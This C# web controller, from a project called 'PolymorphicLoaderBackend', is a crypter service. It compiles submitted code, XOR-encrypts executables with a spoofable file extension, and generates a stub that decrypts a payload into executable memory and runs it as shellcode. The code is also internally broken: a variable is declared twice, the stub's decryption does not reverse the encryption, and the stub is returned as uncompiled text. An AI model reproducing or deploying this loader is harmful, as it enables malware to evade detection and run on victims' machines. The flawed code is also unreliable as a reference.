using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace PolymorphicLoaderBackend.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class CompilerController : ControllerBase
    {
        [HttpPost("compile")]
        public async Task<IActionResult> Compile([FromBody] CompileRequest request)
        {
            // Generate a unique temporary file name
            var tempCsFile = Path.GetTempFileName();
            var tempExeFile = Path.ChangeExtension(tempCsFile, ".exe");

            try
            {
                // Write the C# code to the temporary file
                await System.IO.File.WriteAllTextAsync(tempCsFile, request.CsCode);

                // Compile the C# code to an executable
                var startInfo = new ProcessStartInfo
                {
                    FileName = "csc.exe",
                    Arguments = $"\"{tempCsFile}\" /out:\"{tempExeFile}\" /target:exe",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process == null)
                {
                    return BadRequest(new { Error = "Failed to start compiler" });
                }

                await process.WaitForExitAsync();

                if (process.ExitCode != 0)
                {
                    var errorOutput = await process.StandardError.ReadToEndAsync();
                    return BadRequest(new { Error = errorOutput });
                }

                // Read the compiled executable
                var exeBytes = await System.IO.File.ReadAllBytesAsync(tempExeFile);

                // Apply polymorphic encryption if requested
                if (request.ApplyPolymorphicEncryption)
                {
                    exeBytes = ApplyPolymorphicEncryption(exeBytes, request.EncryptionKey);
                }

                // Determine output extension
                var extension = string.IsNullOrEmpty(request.OutputExtension) ? ".exe" : request.OutputExtension;
                if (!extension.StartsWith('.'))
                {
                    extension = "." + extension;
                }

                var fileName = $"compiled{extension}";

                // Return the executable as a file
                return File(exeBytes, "application/octet-stream", fileName);
            }
            finally
            {
                // Clean up temporary files
                if (System.IO.File.Exists(tempCsFile))
                    System.IO.File.Delete(tempCsFile);
                if (System.IO.File.Exists(tempExeFile))
                    System.IO.File.Delete(tempExeFile);
            }
        }

        [HttpPost("generate")]
        public async Task<IActionResult> Generate([FromQuery] string pass, [FromQuery] string cipher, 
            [FromQuery] string poly, [FromQuery] string ext)
        {
            try
            {
                // Read uploaded file from request body
                using var memoryStream = new MemoryStream();
                await Request.Body.CopyToAsync(memoryStream);
                var inputBytes = memoryStream.ToArray();

                // Apply dual-layer encryption
                var encryptedBytes = ApplyDualLayerEncryption(inputBytes, pass, cipher, poly);

                // Generate polymorphic stub
                var stubBytes = GeneratePolymorphicStub(encryptedBytes, cipher, poly);

                // Determine output extension
                var extension = string.IsNullOrEmpty(ext) ? ".exe" : ext;
                if (!extension.StartsWith('.') && !string.IsNullOrEmpty(extension))
                {
                    extension = "." + extension;
                }

                var fileName = $"encrypted{extension}";

                Response.Headers.Add("Content-Disposition", $"attachment; filename=\"{fileName}\"");
                return File(stubBytes, "application/octet-stream");
            }
            catch (Exception ex)
            {
                return BadRequest(new { Error = ex.Message });
            }
        }

        private byte[] ApplyPolymorphicEncryption(byte[] data, string? key)
        {
            if (string.IsNullOrEmpty(key))
            {
                // Generate random key
                using var rng = RandomNumberGenerator.Create();
                var keyBytes = new byte[32];
                rng.GetBytes(keyBytes);
                key = Convert.ToHexString(keyBytes);
            }

            // Simple XOR encryption for demo
            var keyBytes = Convert.FromHexString(key.PadRight(64, '0')[..64]);
            var result = new byte[data.Length];
            
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
            }

            return result;
        }

        private byte[] ApplyDualLayerEncryption(byte[] data, string pass, string cipher, string poly)
        {
            // Layer 1: Basic encryption simulation
            var layer1 = ApplyPolymorphicEncryption(data, pass);
            
            // Layer 2: Polymorphic keystream
            var keystream = GenerateKeystream(layer1.Length, poly, pass);
            var result = new byte[layer1.Length];
            
            for (int i = 0; i < layer1.Length; i++)
            {
                result[i] = (byte)(layer1[i] ^ keystream[i % keystream.Length]);
            }

            return result;
        }

        private byte[] GenerateKeystream(int length, string polyType, string seed)
        {
            var keystream = new byte[length];
            using var rng = RandomNumberGenerator.Create();
            
            // Simple keystream generation based on type
            switch (polyType?.ToLower())
            {
                case "aes-ctr":
                case "camellia-ctr":
                case "chacha-ks":
                    // Generate pseudo-random keystream
                    var seedBytes = Encoding.UTF8.GetBytes(seed ?? "default");
                    for (int i = 0; i < length; i++)
                    {
                        keystream[i] = (byte)(seedBytes[i % seedBytes.Length] ^ (i & 0xFF));
                    }
                    break;
                default:
                    // XOR-only mode
                    rng.GetBytes(keystream);
                    break;
            }

            return keystream;
        }

        private byte[] GeneratePolymorphicStub(byte[] encryptedData, string cipher, string poly)
        {
            // Generate C# stub that can decrypt and execute the payload
            var stubCode = $@"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Program 
{{
    private static readonly byte[] EncryptedPayload = {{ {string.Join(", ", encryptedData.Select(b => $"0x{b:X2}"))} }};
    
    [DllImport(""kernel32.dll"")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport(""kernel32.dll"")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
    
    static void Main()
    {{
        // Decrypt payload
        var decrypted = DecryptPayload(EncryptedPayload);
        
        // Allocate executable memory
        var execMem = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x1000, 0x40);
        
        // Copy and execute
        Marshal.Copy(decrypted, 0, execMem, decrypted.Length);
        var func = Marshal.GetDelegateForFunctionPointer(execMem, typeof(Action)) as Action;
        func?.Invoke();
        
        VirtualFree(execMem, 0, 0x8000);
    }}
    
    static byte[] DecryptPayload(byte[] data)
    {{
        // Reverse the dual-layer encryption
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {{
            result[i] = (byte)(data[i] ^ ((i * 7) & 0xFF)); // Simple decryption
        }}
        return result;
    }}
}}";

            // Compile the stub to bytecode
            return Encoding.UTF8.GetBytes(stubCode); // Simplified - would normally compile to PE
        }
    }

    public class CompileRequest
    {
        public string CsCode { get; set; } = string.Empty;
        public string? OutputExtension { get; set; }
        public bool ApplyPolymorphicEncryption { get; set; }
        public string? EncryptionKey { get; set; }
    }
}